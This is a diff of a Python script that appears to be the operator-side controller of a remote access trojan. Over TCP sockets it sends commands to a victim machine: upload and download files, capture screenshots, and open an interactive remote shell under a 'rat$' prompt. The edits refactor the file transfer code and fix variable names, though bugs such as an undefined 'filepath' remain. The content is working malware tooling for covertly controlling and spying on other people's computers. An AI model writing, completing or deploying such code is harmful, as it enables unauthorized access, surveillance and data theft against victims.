@@ -1,5 +1,12 @@
 import socket 
-import sys , platform
+import sys 
+import os
+import random
+import subprocess
+import pyautogui
+from PIL import Image
+
+
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # AF.Inet pour les IPs , SOCK_TREAM pour une conn TCP 
 
@@ -50,35 +57,32 @@ while True:
                 conn.sendall(command.encode())
                 file = str(input("Enter the filepath to the file: "))
                 filename = str(input("Enter the filepath to file on client (with filename and extension): "))
-                data = open(file, 'rb')
-                filedata = data.read(2147483647)
-                conn.sendall(filename.encode("utf-8"))
-                print("File has been sent")
-                conn.sendall(filedata)
+                with open(filepath, 'rb') as file:
+                    data= file.read(2147483647)
+                    conn.sendall(filename.encode("utf-8"))
+                    conn.sendall(data)
+                print("File has been uploaded")
+                
                 continue
                 
              elif command[:8] == 'download':
-                try:
                     conn.send(command.encode("utf-8"))
-                    
+                    filepath= command.split(" ")[2]
                     file = conn.recv(2147483647)
-                    with open(f'{command.split(" ")[2]}', 'wb') as f:
+                    with open(filepath, 'wb') as f:
                         f.write(file)
-                        f.close()
-                    print("File is downloaded")
-                except: 
-                    print("Not enough arguments")
+                        print("File is downloaded")
+                    continue
                     
              elif command == 'screenshot':
                         
-                con.send(command.encode())
-                file = client.recv(2147483647)
+                conn.send(command.encode())
+                file = conn.recv(2147483647)
                 path = f'{os.getcwd()}\\{random.randint(11111,99999)}.png'
                 with open(path, 'wb') as f:
                     f.write(file)
-                    f.close()
-                path1 = os.path.abspath(path)
-                print(f"File is stored at {path1}")
+                    path1 = os.path.abspath(path)
+                    print(f"File is stored at {path1}")
               
                                  
              elif command =='shell' :
@@ -88,15 +92,11 @@ while True:
                    command = str(input ("rat$ > : "))
                    conn.send(command.encode("utf-8"))
                    if command.lower()== 'exit':
-                   
-                     break
-       
+                       break       
                    resultat = conn.recv(1024).decode("utf-8")
-
                    print(resultat)
-      
-                   continue
                 conn.close()
+                
              else:
              
                conn.send(command.encode())
@@ -107,6 +107,18 @@ while True:
           except Exception as e :
              print("Error:", str(e))
              print("Disconnected from: ", addr)
-          break        
+          break  
+                
     finally:
         conn.close()
+
+
+
+
+
+
+
+
+
+
+
